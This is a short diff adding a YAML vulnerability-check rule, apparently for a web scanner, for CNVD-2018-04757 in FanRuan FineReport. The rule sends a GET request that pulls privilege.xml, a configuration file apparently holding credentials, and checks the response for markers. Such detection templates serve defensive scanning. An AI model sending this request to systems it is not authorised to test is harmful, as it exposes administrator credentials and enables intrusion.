@@ -1,0 +1,14 @@
+name: poc-yaml-cnvd-2018-04757
+rules:
+  - method: GET
+    path: >-
+      /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+    follow_redirects: false
+    expression: >
+      response.status==200 && r'\[_{3}.*\]'.bmatches(response.body) &&
+      response.body.bcontains(b"releaseVersion")
+detail:
+  author: Hex
+  links:
+    - https://www.fanruan.com/
+
